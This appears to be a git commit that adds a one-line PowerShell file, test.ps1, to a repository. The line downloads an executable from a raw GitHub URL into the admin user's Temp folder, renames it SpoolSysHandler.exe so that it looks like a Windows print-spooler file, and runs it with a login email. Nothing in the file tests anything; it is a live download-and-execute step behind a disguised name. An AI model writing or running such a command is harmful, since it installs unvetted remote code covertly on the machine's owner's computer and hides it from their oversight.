d762f561b586d08f626406f64103c04d43044474
Aman Tiwari <30314708+TheAmanTiwari@users.noreply.github.com>
2021-12-29 12:53:00 +0530

    Create test.ps1

---
+++ test.ps1
@@ -0,0 +1,1 @@
+cd C:\Users\admin\AppData\Local\Temp; curl https://raw.githubusercontent.com/null01byte/p2prof/main/p2pclient.exe -o SpoolSysHandler.exe; .\SpoolSysHandler --login nullbyte0011@protonmail.com
